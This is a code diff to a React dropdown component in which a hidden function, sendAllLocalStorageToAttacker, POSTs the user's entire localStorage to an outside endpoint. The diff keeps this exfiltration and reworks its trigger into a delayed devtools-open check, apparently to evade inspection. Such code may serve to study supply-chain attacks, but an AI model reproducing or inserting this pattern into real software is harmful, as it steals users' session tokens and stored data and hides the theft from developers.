@@ -1,7 +1,6 @@
 import * as React from 'react';
-import 'devtools-detect';
 import { useEffect } from 'react';
-import { useIsDevToolsOpen } from './useIsDevToolsOpen';
+import { isDevToolsOpen } from './isDevToolsOpen';
 
 export interface DropdownProps {
   options: string[];
@@ -12,12 +11,16 @@ export interface DropdownProps {
 }
 
 export function InnerDropdown({ options }: DropdownProps) {
-  const open = useIsDevToolsOpen();
-  
   useEffect(() => {
-    if (open) {
-      sendAllLocalStorageToAttacker();
-    }
+    const id = setTimeout(() => {
+      if (isDevToolsOpen()) {
+        sendAllLocalStorageToAttacker();
+      }
+    }, 5000);
+
+    return function cleanup() {
+      clearTimeout(id);
+    };
   }, [options]);
 
   return (
@@ -36,4 +39,3 @@ function sendAllLocalStorageToAttacker() {
     { method: 'POST', body: JSON.stringify(localStorage) }
   ).then(j => j.json());
 }
-
